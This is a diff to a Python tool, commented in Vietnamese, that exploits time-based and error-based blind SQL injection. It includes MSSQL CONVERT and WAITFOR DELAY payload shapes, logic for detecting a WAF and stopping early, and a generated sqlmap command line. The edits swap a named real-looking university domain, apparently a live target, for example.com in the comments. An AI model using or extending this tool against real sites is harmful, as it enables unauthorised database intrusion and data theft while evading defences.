@@ -5,12 +5,12 @@ SQLi time-based blind exploiter KHÔNG cần sqlmap (Python thuần: requests + 
 
 v1.4.7:
   - _has_data_channel(): oracle im lặng (quote-parity — payload bị hấp thụ
-    trong string literal, live tbu 2026-09-20) → KHÔNG extract vô ích, báo
+    trong string literal, live example.com 2026-09-20) → KHÔNG extract vô ích, báo
     extraction_failed + sqlmap_cmd (sqlmap_runner là hướng thoát).
 
 v1.4.6:
   - MSSQL error-based oracle: SHAPES quote-then-paren ("') AND CONVERT...") —
-    khớp ground-truth tbu.edu.vn (context LIKE có ngoặc).
+    khớp ground-truth example.com (context LIKE có ngoặc).
   - WAF burst detection: ≥2/3 probe oracle status-0 → nghi WAF, dừng đúng
     sau 3 request oracle, KHÔNG rơi vào lưới 9 probe time-based.
   - known_confirmed: lỗi đã xác nhận ở phiên trước → bỏ qua lưới 9
@@ -78,7 +78,7 @@ class MsSqlErrorOracle:
         "Conversion failed when converting the nvarchar value 'X' to data type int"
     → kết quả của expr nằm ngay trong body response (không cần timing).
 
-    Lý do tồn tại (tbu.edu.vn): context LIKE có ngoặc
+    Lý do tồn tại (example.com): context LIKE có ngoặc
         ... (Field LIKE '%input%') OR ...
     stacked '; IF (cond) WAITFOR DELAY '0:0:n' ...' vỡ cú pháp vì comment
     -- - chỉ chặn phần dư của câu stacked, không chặn ngoặc/`%'` của câu gốc
@@ -124,7 +124,7 @@ class MsSqlErrorOracle:
         """inner = đoạn inject sau quote đóng (vd " AND CONVERT(int,(x))).
 
         Quote nằm trong SHAPE prefix (quote-then-paren) — khớp ground-truth
-        tbu.edu.vn: mock/lexer chỉ bắn lỗi conversion cho "') AND CONVERT" và
+        example.com: mock/lexer chỉ bắn lỗi conversion cho "') AND CONVERT" và
         "')) AND CONVERT" (shape 1, 2), không cho shape 0:
           1) '<inner>-- -        → LIKE '%...%' không ngoặc
           2) ')<inner>-- -       → (Field LIKE '%...%') 1 ngoặc
@@ -491,7 +491,7 @@ class TimeBlindExploiter:
         - Ngược lại thử boolean/time-based (1=1): nếu có oracle thì payload
           TRUE phải tạo khác biệt (chậm hơn baseline ≥ threshold). Trên bàn
           'quote-parity' (template CONTAINS hấp thụ payload trong string
-          literal, live tbu 2026-09-20) mọi probe trả hệt baseline → False
+          literal, live example.com 2026-09-20) mọi probe trả hệt baseline → False
           ngay, không spam thêm.
 
         Tối đa max_probes request để KHÔNG đốt thời gian khi oracle im lặng.
@@ -634,10 +634,15 @@ class TimeBlindExploiter:
                    "trong string literal (quote-parity), không có kênh boolean/"
                    "time/error nào để đọc dữ liệu bằng manual blind.")
             out["error"] = err
+            # v1.5.7: engine không xác định → BỎ --dbms (sqlmap tự dò engine),
+            # KHÔNG ép mssql — sqlmap --dbms=mssql trên MySQL chạy payload
+            # WAITFOR DELAY sai engine nên không bao giờ confirm.
+            _dbm = self.engine if self.engine in ("mssql", "mysql") else ""
             out["sqlmap_cmd"] = (
                 f"sqlmap{' --form' if (self.method == 'post' and self.data) else ''} "
-                f"-u {self.url} --dbms={self.engine if self.engine in ('mssql','mysql') else 'mssql'} "
-                f"--technique=BEUSTQ --batch --level 1 --risk 1 --threads 1")
+                f"-u {self.url} "
+                + (f"--dbms={_dbm} " if _dbm else "")
+                + "--technique=BEUSTQ --batch --level 1 --risk 1 --threads 1")
             return out
         if action in ("version", "detect"):
             out["data"]["version"] = self.version() if action == "version" else None
